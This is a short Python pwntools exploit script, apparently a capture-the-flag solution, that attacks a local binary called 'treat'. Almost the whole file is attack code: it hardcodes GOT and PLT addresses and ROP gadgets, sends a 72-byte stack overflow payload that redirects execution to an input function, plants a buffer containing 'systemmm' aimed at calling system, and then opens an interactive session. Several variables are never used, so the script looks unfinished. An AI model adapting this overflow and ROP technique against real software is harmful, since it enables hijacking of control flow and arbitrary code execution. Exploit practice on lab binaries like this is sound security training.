from pwn import *


offset=72

system_got=0x0000000000405028
printf_got=0x0000000000405030
pop_rdi=0x00000000004016a3
ret=0x000000000040101a


system_plt=0x0000000000401050
puts_plt=0x0000000000401040
get_input=0x4011ad

#0x401632
name=0x405080

rdx=0x7ffeccd0d210


p=process("./treat")

payload=""
payload+="A"*72
payload+=p64(get_input)

user=""
user+="1"*80
user+="B"*8
user+="systemmm"
user+="C"*8

p.recv()
p.sendline("AA")
p.recv()
p.sendline(user)
p.recv()
pause()
pause()
p.sendline(payload)
p.interactive()
print p.recv()


